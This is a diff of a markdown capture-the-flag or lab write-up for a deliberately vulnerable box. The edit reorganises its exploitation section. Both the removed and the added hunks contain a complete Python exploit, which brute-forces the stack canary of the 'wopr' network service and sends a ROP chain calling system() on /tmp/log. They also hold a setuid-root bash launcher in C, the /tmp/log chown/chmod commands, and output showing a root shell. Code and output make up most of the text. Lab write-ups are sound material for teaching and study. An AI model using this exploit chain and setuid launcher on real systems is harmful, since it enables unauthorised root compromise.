@@ -422,159 +422,8 @@ uid=0(root) gid=0(root) groups=0(root),500(avida) context=unconfined_u:unconfine
     RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
     Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   /usr/local/bin/wopr
 
-### port forward
+### worp code source
 
-```console
-└─$ ssh -N -f -L 3333:127.0.0.1:3333 avida@192.168.56.8
-```
-### 
-```python
-import socket
-import time
-import struct
-
-def p(x):
-  return struct.pack('<L', x)
-
-
-target = "127.0.0.1"
-port = 3333
-junk = "A"*30
-canary = ""
-for byte in xrange(4):
-  for canary_byte in xrange(256):
-    hex_byte = chr(canary_byte)
-
-    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    client.settimeout(10)
-    client.connect((target, port))
-    # [+] hello, my name is sploitable
-    reponse = client.recv(33)
-    # print (reponse.decode())
-    # [+] would you like to play a game?
-    reponse = client.recv(35)
-    # print (reponse.decode())
-    # >
-    reponse = client.recv(1)
-    # print (reponse.decode())
-
-    client.send(junk+canary+hex_byte)
-
-    # [+] yeah, I don't think so
-    time.sleep(0.1)
-    reponse = client.recv(27)
-    # print (reponse.decode())
-    # [+] bye!
-    reponse = client.recv(9)
-    if (b"bye!" in reponse):
-      canary += hex_byte
-      print (str(canary_byte) + " " + hex(canary_byte))
-      client.close()
-      break
-    client.close()
-
-rop = p(0xdeadbeef) #EBP
-rop += p(0x16c210)  # system
-rop += p(0x15f070)  # exit
-rop += p(0x8048c60) # /tmp/log
-
-payload = junk + canary + rop
-
-client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-client.settimeout(10)
-client.connect((target, port))
-# [+] hello, my name is sploitable
-reponse = client.recv(33)
-# print (reponse.decode())
-# [+] would you like to play a game?
-reponse = client.recv(35)
-# print (reponse.decode())
-# >
-reponse = client.recv(1)
-# print (reponse.decode())
-
-client.send(payload)
-
-# [+] yeah, I don't think so
-time.sleep(0.1)
-reponse = client.recv(27)
-# print (reponse.decode())
-# [+] bye!
-reponse = client.recv(9)
-client.close()
-
-```
-
-```c
-// cat launcher.c
-#include <stdio.h>
-#include <stdlib.h>
-int main() {
-        setuid(0);
-        setgid(0);
-        system("/bin/bash");
-}
-
-```
-```c
-
-#include <stdio.h>
-#include <stdlib.h>
-#include <sys/stat.h>
-#include <sys/unistd.h>
-
-int main() {
-        setuid(0);
-        setgid(0);
-        chown("/tmp/launcher", 0, 0);
-        chmod("/tmp/launcher", S_ISUID|S_IRWXU|S_IRWXG|S_IRWXO);
-}
-
-
-```
-
-
-
-```console
-bash-4.1$ gcc launcher.c -o launcher
-
-bash-4.1$ cat /tmp/log 
-chown root.root /tmp/launcher
-chmod 4755 /tmp/launcher
-bash-4.1$ chmod  +x /tmp/log 
-```
-
-```console
-
-└─$ python2 exploit-worp.py
-
-```
-```console
-bash-4.1$ ls -al /tmp/launcher
--rwsr-xr-x. 1 root root 4864 Jul 23 11:45 /tmp/launcher
-bash-4.1$ /tmp/launcher 
-bash-4.1# id
-uid=0(root) gid=0(root) groups=0(root),500(avida) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
-```
-
-```bash
-# cat /etc/sysconfig/iptables
-*filter
-:INPUT DROP [0:0]
-:FORWARD DROP [0:0]
-:OUTPUT DROP [0:0]
--A INPUT -p icmp -j ACCEPT
--A OUTPUT -p icmp -j ACCEPT
--A INPUT -i lo -j ACCEPT
--A OUTPUT -o lo -j ACCEPT
-
--A INPUT -m state --state NEW,ESTABLISHED -m tcp -p tcp --dport 22 -j ACCEPT
--A OUTPUT -m state --state ESTABLISHED -m tcp -p tcp --sport 22 -j ACCEPT
-
--A INPUT -m state --state NEW,ESTABLISHED -m tcp -p tcp --dport 80 -j ACCEPT
--A OUTPUT -m state --state ESTABLISHED -m tcp -p tcp --sport 80 -j ACCEPT
-COMMIT
-```
 
 ```c
 //
@@ -739,6 +588,127 @@ int main(int argc, char ** argv) {
 
 ```
 
+
+
+### port forward
+
+
+    └─$ ssh -N -f -L 3333:127.0.0.1:3333 avida@192.168.56.8
+
+
+### Exploit program
+
+
+```python
+import socket
+import time
+import struct
+
+def p(x):
+  return struct.pack('<L', x)
+
+
+target = "127.0.0.1"
+port = 3333
+junk = "A"*30
+canary = ""
+for byte in xrange(4):
+  for canary_byte in xrange(256):
+    hex_byte = chr(canary_byte)
+
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    client.settimeout(10)
+    client.connect((target, port))
+    # [+] hello, my name is sploitable
+    reponse = client.recv(33)
+    # print (reponse.decode())
+    # [+] would you like to play a game?
+    reponse = client.recv(35)
+    # print (reponse.decode())
+    # >
+    reponse = client.recv(1)
+    # print (reponse.decode())
+
+    client.send(junk+canary+hex_byte)
+
+    # [+] yeah, I don't think so
+    time.sleep(0.1)
+    reponse = client.recv(27)
+    # print (reponse.decode())
+    # [+] bye!
+    reponse = client.recv(9)
+    if (b"bye!" in reponse):
+      canary += hex_byte
+      print (str(canary_byte) + " " + hex(canary_byte))
+      client.close()
+      break
+    client.close()
+
+rop = p(0xdeadbeef) #EBP
+rop += p(0x16c210)  # system
+rop += p(0x15f070)  # exit
+rop += p(0x8048c60) # /tmp/log
+
+payload = junk + canary + rop
+
+client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+client.settimeout(10)
+client.connect((target, port))
+# [+] hello, my name is sploitable
+reponse = client.recv(33)
+# print (reponse.decode())
+# [+] would you like to play a game?
+reponse = client.recv(35)
+# print (reponse.decode())
+# >
+reponse = client.recv(1)
+# print (reponse.decode())
+
+client.send(payload)
+
+# [+] yeah, I don't think so
+time.sleep(0.1)
+reponse = client.recv(27)
+# print (reponse.decode())
+# [+] bye!
+reponse = client.recv(9)
+client.close()
+
+```
+### Laucher
+
+```c
+// cat launcher.c
+// $ gcc launcher.c -o launcher
+
+#include <stdio.h>
+#include <stdlib.h>
+int main() {
+        setuid(0);
+        setgid(0);
+        system("/bin/bash");
+}
+
+```
+
+### /tmp/log
+
+    bash-4.1$ cat /tmp/log 
+    chown root.root /tmp/launcher
+    chmod 4755 /tmp/launcher
+    bash-4.1$ chmod  +x /tmp/log 
+
+
+### Execution
+
+
+    python2 exploit-worp.py
+    
+    $ ls -al /tmp/launcher
+    -rwsr-xr-x. 1 root root 4864 Jul 23 11:45 /tmp/launcher
+    $ /tmp/launcher 
+    # id
+    uid=0(root) gid=0(root) groups=0(root),500(avida) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
 
 # Box's configuration
 
